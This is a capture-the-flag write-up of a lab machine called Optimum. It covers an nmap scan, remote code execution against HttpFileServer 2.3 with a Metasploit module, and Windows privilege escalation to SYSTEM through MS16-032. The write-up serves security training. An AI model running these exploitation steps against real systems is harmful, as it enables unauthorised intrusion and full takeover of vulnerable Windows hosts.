# Optimum

## Recon

Grab the target IP address and run `nmap` against it:

```
$ nmap -sV -sC -p- -T4 -oN nmap_scan.txt 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.15s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see that the target is only running HTTP. More specifically, it's hosting an
HttpFileServer. 

## Vulnerability Discovery

A quick web search for "HttpFileServer 2.3" yields exploits from
[exploit-db](https://www.exploit-db.com/exploits/39161) and
[rapid7](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/).

Both links state that this server is vulnerable to remote code execution by
using '%00' (null byte) to bypass a filter.

Now that we know what exploit to use, let's fire up metasploit.

## Exploitation

Once metasploit has loaded:

```
msf > use exploit/windows/http/rejetto_hfs_exec
msf exploit(rejetto_hfs_exec) > show options
... show and set options...
msf exploit(rejetto_hfs_exec) > exploit
...
meterpreter >
```

We have a shell! Time to get the user flag:

```
meterpreter > getuid
Server username: OPTIMUM\kostas
meterpreter > dir
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2021-04-07 22:49:48 -0400  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 06:58:52 -0500  hfs.exe
100444/r--r--r--  32      fil   2017-03-18 08:13:18 -0400  user.txt.txt

meterpreter > cat user.txt.txt
```

## Privilege Escalation

Run `sysinfo` to get system information about the target:

```
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

I Googled for "Windows 2012 R2 (6.3 Build 9600) privilege escalation" and found
a link to [(MS16-032) local privilege escalation from
exploit-db](https://www.exploit-db.com/exploits/39719).

We can exploit this manually with the linked powershell script, or use
metasploit. Since I already have an active meterpreter session, I went with
metasploit.

```
meterpreter > background
...
msf > search ms16-032
msf > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf (windows/local/ms16_032_secondary_logon_handle_privesc) > show targets
... show and set targets ...
msf (windows/local/ms16_032_secondary_logon_handle_privesc) > show options
... show and set options ...
msf (windows/local/ms16_032_secondary_logon_handle_privesc) > run
```

You should now have a second meterpreter session as the SYSTEM user!

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

From here, grabbing the root flag is easy:

```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\Administrator\Desktop

18/03/2017  03:14     <DIR>          .
18/03/2017  03:14     <DIR>          ..
18/03/2017  03:14                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  31.892.807.680 bytes free

C:\Users\Administrator\Desktop>more root.txt
```
